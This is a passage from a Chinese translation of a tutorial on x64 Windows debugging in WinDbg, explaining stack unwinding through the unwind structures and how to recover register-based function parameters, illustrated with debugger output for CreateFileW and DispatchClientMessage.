<p>在下面的调用栈中，栈帧#1的Child-SP是00000000`0029bc00，这是函数CreateFileW()的初始化阶段结束以后，RSP的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; knf</div><div class="line"> #   Memory  Child-SP          RetAddr           Call Site</div><div class="line">00           00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01         8 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02       160 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">03        60 00000000`0029bdc0 000007fe`fe55dc08 usp10!UniStorInit+0xdd</div><div class="line">04        a0 00000000`0029be60 000007fe`fe5534af usp10!InitUnistor+0x1d8</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>如上所述，函数#01的RSP(value is 00000000`0029bc00)所指位置之前的8个字节应该是函数#00的返回地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dps 00000000`0029bc00-8 L1</div><div class="line">00000000`0029bbf8  000007fe`fdd24d76 KERNELBASE!CreateFileW+0x2cd</div></pre></td></tr></table></figure>
<h2 id="回溯调用栈（Walking-the-call-stack）"><a href="#回溯调用栈（Walking-the-call-stack）" class="headerlink" title="回溯调用栈（Walking the call stack）"></a>回溯调用栈（Walking the call stack）</h2><p>在X86 CPU上，调试器使用EBP chain来回溯调用栈，从最近的函数栈帧到最远的函数栈帧。通常情况下，调试器可以回溯栈帧，而不依赖于调试符号。然而，EBP chain可能会在某些情况下被破坏，如frame pointer omitted(FPO)。这种情况下，调试器需要使用相应的调试符号才能正确地回溯栈帧。</p>
<p>在X64函数中，并没有使用RBP作为栈帧指针，从而，调试器没有EBP chain来做栈回溯。在这种情况下，调试器通过定位RUNTIME_FUNCTION, UNWIND_INFO和UNWIND_CODE这些结构，去计算每一个函数所需的栈帧空间，然后，加上相应的RSP，便可以计算出下面Child-SP的值。</p>
<p>图13展示函数栈帧的布局，栈帧的大小=返回地址（8个字节）+非易失性寄存器+局部变量+基于栈的参数+基于寄存器的参数（0x20个字节）。UNWIND_CODE中的信息包含了非易失性寄存器的数量，以及栈上的局部变量和参数信息。</p>
<p><img src="(/images/x64deepdive/13.png" alt="Figure 13 : Walking the x64 call stack"></p>
<p>下面的调用栈中，栈帧#1（CreateFileW）所对应的栈帧空间时0x160个字节，下一节会告诉你，这个数值是如何计算出来的，以及调试器是如何计算栈帧#2的Child-SP的。注意：函数#1栈帧空间的值是在函数#2的Memory栏。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; knf</div><div class="line"> #   Memory  Child-SP          RetAddr           Call Site</div><div class="line">00           00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01         8 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02       160 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">03        60 00000000`0029bdc0 000007fe`fe55dc08 usp10!UniStorInit+0xdd</div><div class="line">04        a0 00000000`0029be60 000007fe`fe5534af usp10!InitUnistor+0x1d8</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>下面是UNWIND_CODE的输出信息。共有4个非易失性寄存器被压入栈中，分配了0x138字节的空间给局部变量和参数使用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0:000&gt; .fnent kernelbase!CreateFileW</div><div class="line">Debugger function entry 00000000`03be6580 for:</div><div class="line">(000007fe`fdd24ac0)   KERNELBASE!CreateFileW   |  (000007fe`fdd24e2c)   KERNELBASE!SbSelectProcedure</div><div class="line">Exact matches:</div><div class="line">    KERNELBASE!CreateFileW = </div><div class="line"></div><div class="line">BeginAddress      = 00000000`00004ac0</div><div class="line">EndAddress        = 00000000`00004b18</div><div class="line">UnwindInfoAddress = 00000000`00059a48</div><div class="line"></div><div class="line">Unwind info at 000007fe`fdd79a48, 10 bytes</div><div class="line">  version 1, flags 0, prolog 14, codes 6</div><div class="line">  frame reg 0, frame offs 0</div><div class="line">  00: offs 14, unwind op 1, op info 0	UWOP_ALLOC_LARGE FrameOffset: 138</div><div class="line">  02: offs d, unwind op 0, op info 7	UWOP_PUSH_NONVOL</div><div class="line">  03: offs c, unwind op 0, op info 6	UWOP_PUSH_NONVOL</div><div class="line">  04: offs b, unwind op 0, op info 5	UWOP_PUSH_NONVOL</div><div class="line">  05: offs a, unwind op 0, op info 3	UWOP_PUSH_NONVOL</div></pre></td></tr></table></figure>
<p>根据上面的分析，栈帧空间应该是0x138+(8*4)=0x158字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ?138+(8*4)</div><div class="line">Evaluate expression: 344 = 00000000`00000158</div></pre></td></tr></table></figure>
<p>再加上8个字节的返回地址，正好是0x160字节。这与调试命令<code>knf</code>所显示的一致。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ?158+8</div><div class="line">Evaluate expression: 352 = 00000000`00000160</div></pre></td></tr></table></figure>
<p>根据<code>knf</code>命令的输出，调试器在栈帧#01的RSP（00000000`0029bc00）基础上加上0x160，正好可以得到栈帧#02的RSP，即：00000000`0029bd60</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ?00000000`0029bc00+160</div><div class="line">Evaluate expression: 2735456 = 00000000`0029bd60</div></pre></td></tr></table></figure>
<p>所以，每一个栈帧所需的空间可以通过PE文件中的RUNTIME_FUNCTION,UNWIND_INFO以及UNWIND_CODE计算出。由于这个原因，调试器可以无需调试符号的情况下回溯栈帧。下面的调用栈是vmswitch模块的状态，虽然没有调试符号，但是，这并不影响调试器正常地显示和回溯栈帧。这里告诉了一个事实：X64调用栈可以在没有调试符号的情况下回溯。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">1: kd&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 fffffa60`005f1a68 fffff800`01ab70ee nt!KeBugCheckEx</div><div class="line">01 fffffa60`005f1a70 fffff800`01ab5938 nt!KiBugCheckDispatch+0x6e</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">21 fffffa60`01718840 fffffa60`0340b69e vmswitch+0x5fba</div><div class="line">22 fffffa60`017188f0 fffffa60`0340d5cc vmswitch+0x769e</div><div class="line">23 fffffa60`01718ae0 fffffa60`0340e615 vmswitch+0x95cc</div><div class="line">24 fffffa60`01718d10 fffffa60`009ae31a vmswitch+0xa615</div><div class="line">.</div><div class="line">.</div><div class="line">.</div><div class="line">44 fffffa60`0171aed0 fffffa60`0340b69e vmswitch+0x1d286</div><div class="line">45 fffffa60`0171af60 fffffa60`0340d4af vmswitch+0x769e</div><div class="line">46 fffffa60`0171b150 fffffa60`034255a0 vmswitch+0x94af</div><div class="line">47 fffffa60`0171b380 fffffa60`009ac33c vmswitch+0x215a0</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<h1 id="参数找回（Parameter-Retrieval）"><a href="#参数找回（Parameter-Retrieval）" class="headerlink" title="参数找回（Parameter Retrieval）"></a>参数找回（Parameter Retrieval）</h1><p>在之前的章节中，我们通过调试器输出的调用栈的信息剖析了X64的内部工作机理。在本节中，这些理论知识将被用于找回基于寄存器的参数。很不幸，并没有什么特别有效的方法去找回这些参数，这里所介绍的技巧依赖于X64汇编指令。如果参数不能在memory中找到，那么，并没有什么简单的方法去获取这种参数。即便有调试符号，也没有什么帮助，因为，调试符号会告诉相应函数的参数类型以及数量，但是，并不会告诉我们这些参数是什么。</p>
<h2 id="技术总结-Summary-of-Techniques"><a href="#技术总结-Summary-of-Techniques" class="headerlink" title="技术总结(Summary of Techniques)"></a>技术总结(Summary of Techniques)</h2><p>本节讨论是假设X64函数并没有使用/homeparams编译，当使用了/homeparams，找回基于寄存器的参数并没有意义，因为它们已经被放在栈上的homing parameters区域。同样，无论是否使用/homeparams，第五个以及更高的参数也被放在栈上，所以，找回这些参数也不是什么问题。</p>
<p>在live debugging中，在函数上设置断点是最简单的方法去获取传入的参数，因为在函数的初始化阶段，前四个参数肯定是放在RCX,RDX,R8和R9上的。</p>
<p>然而，在函数体内，参数寄存器的内容可能已经改变了，所以，在函数执行的任何时刻，确定寄存器参数的值，我们需要知道，这些参数是从哪里读取的，以及将被写入到什么地方？可以按照下面这些过程来回答这些问题：</p>
<ul>
<li>参数是否是从内存中加载到寄存器中的，如果是的话，相应的内存位置存放参数值</li>
<li>参数是否是从非易失性寄存器中加载的，并且，这些非易失性寄存器被被调函数保存，如果是的话，非易失性寄存器存放参数</li>
<li>参数是否是从寄存器中保存到内存中，如果是的话，相应的内存位置存放参数值</li>
<li>参数是否是保存到非易失性寄存器中，并且，这些非易失性寄存器被被调函数保存，如果是的话，非易失性寄存器存放参数</li>
</ul>
<p>在下面章节中，会用例子详细描述上面介绍的技巧，每一个技巧都需要反汇编相应调用函数与被调函数。在图14中，为了找出函数f2的参数，frame 02用于从源头找出参数，frame 00用于从目标找出参数。</p>
<p><img src="/images/x64deepdive/14.png" alt="Figure 14 : Finding Register Based Parameters"></p>
<h2 id="识别参数的读取目标（Identifying-Parameter-Sources）"><a href="#识别参数的读取目标（Identifying-Parameter-Sources）" class="headerlink" title="识别参数的读取目标（Identifying Parameter Sources）"></a>识别参数的读取目标（Identifying Parameter Sources）</h2><p>这个技巧是用于识别被加载到参数寄存器的值所对应的源是什么，对常量、全局数据、栈地址和存放在栈上的数据有效。</p>
<p>如图15所示，反汇编X64Caller可以看到加载到RCX,RDX,R8和R9的值，被作为参数传入X64Callee</p>
<p><img src="/images/x64deepdive/15.png" alt="Figure 15 : Identifying parameter sources"></p>
<p>下面的例子用这个技巧来找出函数NtCreateFile()的第三个参数的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>从函数NtCreateFile()的原型可以知道，第三个参数的类型是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function">POBJECT_ATTRIBUTES</span></div><div class="line">NTSTATUS <span class="title">NtCreateFile</span><span class="params">(</span></div><div class="line">  __out     PHANDLE FileHandle,</div><div class="line">  __in      ACCESS_MASK DesiredAccess,</div><div class="line">  __in      POBJECT_ATTRIBUTES ObjectAttributes,</div><div class="line">  __out     PIO_STATUS_BLOCK IoStatusBlock,</div><div class="line">.</div><div class="line">.</div><div class="line">. );</div></pre></td></tr></table></figure>
<p>用返回地址反汇编调用者，显示下面的指令。加载到R8寄存器的值是RSP+0xC8。根据上面<code>kn</code>命令的输出，此时的RSP是函数KERNELBASE!CreateFileW的RSP，即：00000000`0029bc00</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ub 000007fe`fdd24d76</div><div class="line">KERNELBASE!CreateFileW+0x29d:</div><div class="line">000007fe`fdd24d46 and     ebx,7FA7h</div><div class="line">000007fe`fdd24d4c lea     r9,[rsp+88h]</div><div class="line">000007fe`fdd24d54 lea     r8,[rsp+0C8h]</div><div class="line">000007fe`fdd24d5c lea     rcx,[rsp+78h]</div><div class="line">000007fe`fdd24d61 mov     edx,ebp</div><div class="line">000007fe`fdd24d63 mov     dword ptr [rsp+28h],ebx</div><div class="line">000007fe`fdd24d67 mov     qword ptr [rsp+20h],0</div><div class="line">000007fe`fdd24d70 call    qword ptr [KERNELBASE!_imp_NtCreateFile]</div></pre></td></tr></table></figure>
<p>手工重构被加载到R8的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dt ntdll!_OBJECT_ATTRIBUTES 00000000`0029bc00+c8</div><div class="line">   +0x000 Length           : 0x30</div><div class="line">   +0x008 RootDirectory    : (null) </div><div class="line">   +0x010 ObjectName       : 0x00000000`0029bcb0 _UNICODE_STRING &quot;\??\C:\Windows\Fonts\staticcache.dat&quot;</div><div class="line">   +0x018 Attributes       : 0x40</div><div class="line">   +0x020 SecurityDescriptor : (null) </div><div class="line">   +0x028 SecurityQualityOfService : 0x00000000`0029bc68</div></pre></td></tr></table></figure></p>
<h2 id="非易失性寄存器做参数读取目标（Non-Volatile-Registers-as-parameter-sources）"><a href="#非易失性寄存器做参数读取目标（Non-Volatile-Registers-as-parameter-sources）" class="headerlink" title="非易失性寄存器做参数读取目标（Non-Volatile Registers as parameter sources）"></a>非易失性寄存器做参数读取目标（Non-Volatile Registers as parameter sources）</h2><p>图16显示调用函数（X64Caller）和被调函数（X64Callee）的汇编代码。从下面的汇编代码可以看出，被加载到参数寄存器中的值是从非易失性寄存器中读取的，并且，这些非易失性寄存器又被保存在被调函数的栈上。这些保存的值可以被找回，也就间接地说明之前传入的参数也可以被找回。</p>
<p><img src="/images/x64deepdive/16.png" alt="Figure 16 : Non-Volatile Registers as parameter sources"></p>
<p>下面的例子使用这个技巧，用于找回函数CreateFileW()的第一个参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>函数CreateFile()的原型如下，第一个参数的类型是LPCTSTR</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">HANDLE WINAPI </div><div class="line">CreateFile(</div><div class="line">  __in      LPCTSTR lpFileName,</div><div class="line">  __in      DWORD dwDesiredAccess,</div><div class="line">  __in      DWORD dwShareMode,</div><div class="line">  __in_opt  LPSECURITY_ATTRIBUTES lpSecurityAttributes,</div><div class="line">.</div><div class="line">.</div><div class="line">. );</div></pre></td></tr></table></figure>
<p>使用frame 1的返回地址，反汇编调用函数。加载到RCX的值是RDI，一个非易失性寄存器。下一步是看看被调函数如何保存RDI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0:000&gt; ub 00000000`77ac2aad L B</div><div class="line">kernel32!CreateFileWImplementation+0x4a:</div><div class="line">00000000`77ac2a7a mov     rax,qword ptr [rsp+90h]</div><div class="line">00000000`77ac2a82 mov     r9,rsi</div><div class="line">00000000`77ac2a85 mov     r8d,ebp</div><div class="line">00000000`77ac2a88 mov     qword ptr [rsp+30h],rax</div><div class="line">00000000`77ac2a8d mov     eax,dword ptr [rsp+88h]</div><div class="line">00000000`77ac2a94 mov     edx,ebx</div><div class="line">00000000`77ac2a96 mov     dword ptr [rsp+28h],eax</div><div class="line">00000000`77ac2a9a mov     eax,dword ptr [rsp+80h]</div><div class="line">00000000`77ac2aa1 mov     rcx,rdi</div><div class="line">00000000`77ac2aa4 mov     dword ptr [rsp+20h],eax</div><div class="line">00000000`77ac2aa8 call    kernel32!CreateFileW (00000000`77ad2c88)</div></pre></td></tr></table></figure>
<p>反汇编被调函数，看看函数的初始阶段指令。RDI是被指令<code>push rdi</code>压入栈中，这个值与RCX的值一致。下一步是找回RDI的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; u KERNELBASE!CreateFileW</div><div class="line">KERNELBASE!CreateFileW:</div><div class="line">000007fe`fdd24ac0 mov     dword ptr [rsp+18h],r8d</div><div class="line">000007fe`fdd24ac5 mov     dword ptr [rsp+10h],edx</div><div class="line">000007fe`fdd24ac9 push    rbx</div><div class="line">000007fe`fdd24aca push    rbp</div><div class="line">000007fe`fdd24acb push    rsi</div><div class="line">000007fe`fdd24acc push    rdi</div><div class="line">000007fe`fdd24acd sub     rsp,138h</div><div class="line">000007fe`fdd24ad4 mov     edi,dword ptr [rsp+180h]</div></pre></td></tr></table></figure>
<p>调试器的<code>.frame /r</code>命令显示非易失性寄存器的值，所以，可以用于找回上述的非易失性寄存器RDI。下面的命令显示RDI为000000000029beb0，这个值可以用于显示CreateFile()函数的第一个参数file name.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">0:000&gt; .frame /r 2</div><div class="line">02 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">rax=0000000000000005 rbx=0000000080000000 rcx=000000000029bc78</div><div class="line">rdx=0000000080100080 rsi=0000000000000000 rdi=000000000029beb0</div><div class="line">rip=0000000077ac2aad rsp=000000000029bd60 rbp=0000000000000005</div><div class="line"> r8=000000000029bcc8  r9=000000000029bc88 r10=0057005c003a0043</div><div class="line">r11=00000000003ab0d8 r12=0000000000000000 r13=ffffffffb6011c12</div><div class="line">r14=0000000000000000 r15=0000000000000000</div><div class="line"></div><div class="line">0:000&gt; du /c 100 000000000029beb0</div><div class="line">00000000`0029beb0  &quot;C:\Windows\Fonts\staticcache.dat&quot;</div></pre></td></tr></table></figure>
<h2 id="识别参数存储目标（Identifying-parameter-destinations）"><a href="#识别参数存储目标（Identifying-parameter-destinations）" class="headerlink" title="识别参数存储目标（Identifying parameter destinations）"></a>识别参数存储目标（Identifying parameter destinations）</h2><p>这个技巧是找出参数寄存器中的值是否被写入内存。当函数使用/homeparams编译时，函数的初始阶段将保存寄存器参数到栈上的参数homing区域。然而，对于那些没有使用/homeparams编译的函数，参数寄存器的内容可能被写入到任意的内存区域。</p>
<p>图17展示函数的汇编代码，这里寄存器RCX，RDX，R8和R9的值被写入栈上。所以，可以使用当前栈帧的RSP来确定相应参数的内容。</p>
<p><img src="/images/x64deepdive/17.png" alt="Figure 17 : Identifying parameter destinations"></p>
<p>下面的例子使用这个技巧找出函数DispatchClientMessage()的第三个和第四个参数的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">. </div><div class="line">. </div><div class="line">.</div><div class="line">26 00000000`0029dc70 00000000`779ca01b user32!UserCallWinProcCheckWow+0x1ad</div><div class="line">27 00000000`0029dd30 00000000`779c2b0c user32!DispatchClientMessage+0xc3</div><div class="line">28 00000000`0029dd90 00000000`77c1fdf5 user32!_fnINOUTNCCALCSIZE+0x3c</div><div class="line">29 00000000`0029ddf0 00000000`779c255a ntdll!KiUserCallbackDispatcherContinue</div><div class="line">. </div><div class="line">. </div><div class="line">.</div></pre></td></tr></table></figure>
<p>函数的第三个和第四个参数分别被放置在R8和R9寄存器上。反汇编函数DispatchClientMessage()，查看R8和R9被写入到什么位置。可以看到这两个寄存器分别被这两条指令写入栈上，’mov qword ptr [rsp+20h],r8’ and ’mov qword ptr [rsp+28h],r9’。由于这两条指令并非在函数的初始阶段，而只是函数体首部的一部分。值得注意的是，在保存r8,r9之前，很有可能这两个寄存器的值已经被修改，所以，我们在使用这个技巧的时候，需要注意这个细节。当然，我们可以看到，这个例子中并没有这样的问题。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf user32!DispatchClientMessage</div><div class="line">user32!DispatchClientMessage:</div><div class="line">00000000`779c9fbc sub     rsp,58h</div><div class="line">00000000`779c9fc0 mov     rax,qword ptr gs:[30h]</div><div class="line">00000000`779c9fc9 mov     r10,qword ptr [rax+840h]</div><div class="line">00000000`779c9fd0 mov     r11,qword ptr [rax+850h]</div><div class="line">00000000`779c9fd7 xor     eax,eax</div><div class="line">00000000`779c9fd9 mov     qword ptr [rsp+40h],rax</div><div class="line">00000000`779c9fde cmp     edx,113h</div><div class="line">00000000`779c9fe4 je      user32!DispatchClientMessage+0x2a (00000000`779d7fe3)</div><div class="line"></div><div class="line">user32!DispatchClientMessage+0x92:</div><div class="line">00000000`779c9fea lea     rax,[rcx+28h]</div><div class="line">00000000`779c9fee mov     dword ptr [rsp+38h],1</div><div class="line">00000000`779c9ff6 mov     qword ptr [rsp+30h],rax</div><div class="line">00000000`779c9ffb mov     qword ptr [rsp+28h],r9</div><div class="line">00000000`779ca000 mov     qword ptr [rsp+20h],r8</div><div class="line">00000000`779ca005 mov     r9d,edx</div><div class="line">00000000`779ca008 mov     r8,r10</div><div class="line">00000000`779ca00b mov     rdx,qword ptr [rsp+80h]</div><div class="line">00000000`779ca013 mov     rcx,r11</div><div class="line">00000000`779ca016 call    user32!UserCallWinProcCheckWow (00000000`779cc2a4)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>使用函数#27的RSP，可以分别找出r8和r9中的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0:000&gt; dp 00000000`0029dd30+20 L1</div><div class="line">00000000`0029dd50  00000000`00000000</div><div class="line">0:000&gt; dp 00000000`0029dd30+28 L1</div><div class="line">00000000`0029dd58  00000000`0029de70</div></pre></td></tr></table></figure>
<h2 id="参数的存储目标是非易失性寄存器（Non-Volatile-Registers-as-Parameter-Destinations）"><a href="#参数的存储目标是非易失性寄存器（Non-Volatile-Registers-as-Parameter-Destinations）" class="headerlink" title="参数的存储目标是非易失性寄存器（Non-Volatile Registers as Parameter Destinations）"></a>参数的存储目标是非易失性寄存器（Non-Volatile Registers as Parameter Destinations）</h2><p>图18展示x64caller与x64callee的汇编代码。左边的代码说明寄存器参数被存放在非易失性寄存器（RDI，RSI，RBX，RBP）上，右边的代码说明这些非易失性寄存器的值被保存在栈上，所以，我们可以间接地找出传入的参数。</p>
<p><img src="/images/x64deepdive/18.png" alt="Figure 18 : Non-Volatile Registers as Parameter Destinations"></p>
<p>下面的例子将找出函数CreateFileW ()的前4个参数（译者注：原文是找出函数CreateFileWImplementation()的参数，可能是作者的笔误）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">0:000&gt; kn</div><div class="line"> # Child-SP          RetAddr           Call Site</div><div class="line">00 00000000`0029bbf8 000007fe`fdd24d76 ntdll!NtCreateFile</div><div class="line">01 00000000`0029bc00 00000000`77ac2aad KERNELBASE!CreateFileW+0x2cd</div><div class="line">02 00000000`0029bd60 000007fe`fe5b9ebd kernel32!CreateFileWImplementation+0x7d</div><div class="line">03 00000000`0029bdc0 000007fe`fe55dc08 usp10!UniStorInit+0xdd</div></pre></td></tr></table></figure>
<p>函数CreateFileWImplementation()完整的汇编代码如下，从函数初始阶段的指令来看，参数寄存器被保存在非易失性寄存器中。注意：检查在调用CreateFileW之前，这些非易失性寄存器没有被修改过，这很重要！下一步是反汇编CreateFileW函数，找出这些保存参数的非易失性寄存器是否被保存在栈上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">0:000&gt; uf kernel32!CreateFileWImplementation</div><div class="line">kernel32!CreateFileWImplementation:</div><div class="line">00000000`77ac2a30 mov     qword ptr [rsp+8],rbx</div><div class="line">00000000`77ac2a35 mov     qword ptr [rsp+10h],rbp</div><div class="line">00000000`77ac2a3a mov     qword ptr [rsp+18h],rsi</div><div class="line">00000000`77ac2a3f push    rdi</div><div class="line">00000000`77ac2a40 sub     rsp,50h</div><div class="line">00000000`77ac2a44 mov     ebx,edx</div><div class="line">00000000`77ac2a46 mov     rdi,rcx</div><div class="line">00000000`77ac2a49 mov     rdx,rcx</div><div class="line">00000000`77ac2a4c lea     rcx,[rsp+40h]</div><div class="line">00000000`77ac2a51 mov     rsi,r9</div><div class="line">00000000`77ac2a54 mov     ebp,r8d</div><div class="line">00000000`77ac2a57 call    qword ptr [kernel32!_imp_RtlInitUnicodeStringEx (00000000`77b4cb90)]</div><div class="line">00000000`77ac2a5d test    eax,eax</div><div class="line">00000000`77ac2a5f js      kernel32!zzz_AsmCodeRange_End+0x54ec (00000000`77ae7bc0)</div><div class="line">.</div><div class="line">.</div><div class="line">.</div></pre></td></tr></table></figure>
<p>下面函数CreateFileW()的汇编代码可以看出，这些非易失性寄存器都被保存在栈上，从而使用命令<code>.frame /r</code>来显示这些值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">0:000&gt; u KERNELBASE!CreateFileW</div><div class="line">KERNELBASE!CreateFileW:</div><div class="line">000007fe`fdd24ac0 mov     dword ptr [rsp+18h],r8d</div><div class="line">000007fe`fdd24ac5 mov     dword ptr [rsp+10h],edx</div><div class="line">000007fe`fdd24ac9 push    rbx</div><div class="line">000007fe`fdd24aca push    rbp</div><div class="line">000007fe`fdd24acb push    rsi</div><div class="line">000007fe`fdd24acc push    rdi</div><div class="line">000007fe`fdd24acd sub     rsp,138h</div><div class="line">000007fe`fdd24ad4 mov     edi,dword 